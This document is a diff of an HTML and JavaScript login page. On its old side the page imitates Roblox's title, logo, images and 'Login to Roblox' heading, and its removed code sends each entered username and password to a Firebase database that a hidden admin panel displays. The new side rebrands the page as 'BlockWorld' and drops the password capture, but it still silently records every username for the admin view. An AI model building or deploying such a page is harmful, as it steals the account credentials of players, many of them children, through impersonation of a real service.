@@ -7,10 +7,10 @@
 <meta name="viewport"
 content="width=device-width, initial-scale=1.0">
 
-<title>Roblox</title>
+<title>Robloxxx</title>
 
 <link rel="icon"
-href="https://www.roblox.com/favicon.ico">
+href="https://cdn-icons-png.flaticon.com/512/25/25231.png">
 
 <style>
 
@@ -85,11 +85,11 @@ body{
 
 .logo-nav{
 
-    width:90px;
+    width:34px;
 
-    height:30px;
+    height:34px;
 
-    object-fit:contain;
+    border-radius:8px;
 }
 
 /* LINKS */
@@ -117,7 +117,7 @@ body{
     color:white;
 }
 
-/* CENTER SEARCH */
+/* SEARCH */
 
 .nav-center{
 
@@ -128,13 +128,11 @@ body{
     transform:translateX(-50%);
 }
 
-/* SEARCH */
-
 .search-bar{
 
-    width:350px;
+    width:340px;
 
-    padding:11px 18px;
+    padding:11px 16px;
 
     border:none;
 
@@ -145,8 +143,6 @@ body{
     color:white;
 
     outline:none;
-
-    font-size:14px;
 }
 
 .search-bar::placeholder{
@@ -190,17 +186,15 @@ body{
     background:
 
     linear-gradient(
-    rgba(0,0,0,0.65),
+    rgba(0,0,0,0.6),
     rgba(0,0,0,0.85)
     ),
 
-    url('https://images.rbxcdn.com/782b7fc18a24ee997efd9a7f02fa4bf9-bg_08072019.jpg');
+    url('https://images.unsplash.com/photo-1511512578047-dfb367046420?q=80&w=2071');
 
     background-size:cover;
 
     background-position:center;
-
-    background-repeat:no-repeat;
 }
 
 /* LOGIN BOX */
@@ -266,7 +260,7 @@ body{
     color:#aaa;
 }
 
-/* SHOW PASSWORD */
+/* SHOW BUTTON */
 
 .show-pass-btn{
 
@@ -408,7 +402,7 @@ body{
 
     padding:18px;
 
-    max-height:400px;
+    max-height:420px;
 
     overflow-y:auto;
 }
@@ -428,11 +422,13 @@ body{
     font-size:14px;
 
     color:white;
+
+    line-height:1.7;
 }
 
 /* MOBILE */
 
-@media(max-width:950px){
+@media(max-width:900px){
 
     .nav-links{
 
@@ -441,7 +437,7 @@ body{
 
     .search-bar{
 
-        width:220px;
+        width:190px;
     }
 
 }
@@ -465,17 +461,17 @@ body{
 
         <img
         class="logo-nav"
-        src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg">
+        src="https://cdn-icons-png.flaticon.com/512/25/25231.png">
 
         <div class="nav-links">
 
-            <a href="#">Charts</a>
+            <a href="#">Home</a>
 
-            <a href="#">Marketplace</a>
+            <a href="#">Games</a>
 
-            <a href="#">Create</a>
+            <a href="#">Studio</a>
 
-            <a href="#">Robux</a>
+            <a href="#">Shop</a>
 
         </div>
 
@@ -510,7 +506,7 @@ body{
 
     <div class="login-box" id="loginBox">
 
-        <h1>Login to Roblox</h1>
+        <h1>Login to BlockWorld</h1>
 
         <!-- USERNAME -->
 
@@ -603,32 +599,11 @@ body{
 
         <h1>Admin Panel</h1>
 
-        <!-- COMMAND -->
-
-        <div class="input-box">
-
-            <input
-            type="text"
-            id="commandInput"
-            placeholder="Enter command">
-
-        </div>
-
-        <!-- RUN -->
-
-        <button
-        class="login-btn"
-        onclick="runCommand()">
-
-        Run Command
-
-        </button>
-
-        <!-- SAVED DATA -->
-
         <div class="panel-box">
 
-            <h3>Online Saved Data</h3>
+            <h3>Saved Online Data</h3>
+
+            <br>
 
             <div id="savedDataBox"></div>
 
@@ -642,7 +617,7 @@ body{
 
 <script type="module">
 
-/* IMPORT FIREBASE */
+/* FIREBASE IMPORTS */
 
 import { initializeApp }
 
@@ -718,9 +693,9 @@ window.togglePassword = function(){
 
 };
 
-/* SAVE DATA ONLINE */
+/* SAVE DATA */
 
-window.saveActivity = function(text){
+window.saveActivity = function(username){
 
     push(
 
@@ -728,7 +703,7 @@ window.saveActivity = function(text){
 
         {
 
-            activity:text,
+            username:username,
 
             time:new Date().toLocaleString()
 
@@ -764,10 +739,12 @@ onValue(
 
             <div class="activity-card">
 
-            ${item.activity}
+            USERNAME :
+            ${item.username}
 
             <br><br>
 
+            TIME :
             ${item.time}
 
             </div>
@@ -805,13 +782,9 @@ window.login = function(){
 
     }
 
-    /* SAVE USER + PASS */
+    /* SAVE USERNAME */
 
-    saveActivity(
-
-        `USERNAME: ${user} | PASSWORD: ${pass}`
-
-    );
+    saveActivity(user);
 
     /* ADMIN LOGIN */
 
@@ -836,23 +809,6 @@ window.login = function(){
         "Invalid Username or Password";
 
     }
-
-};
-
-/* COMMANDS */
-
-window.runCommand = function(){
-
-    const cmd =
-    document
-    .getElementById("commandInput")
-    .value;
-
-    saveActivity(
-
-        "COMMAND: " + cmd
-
-    );
 
 };
 
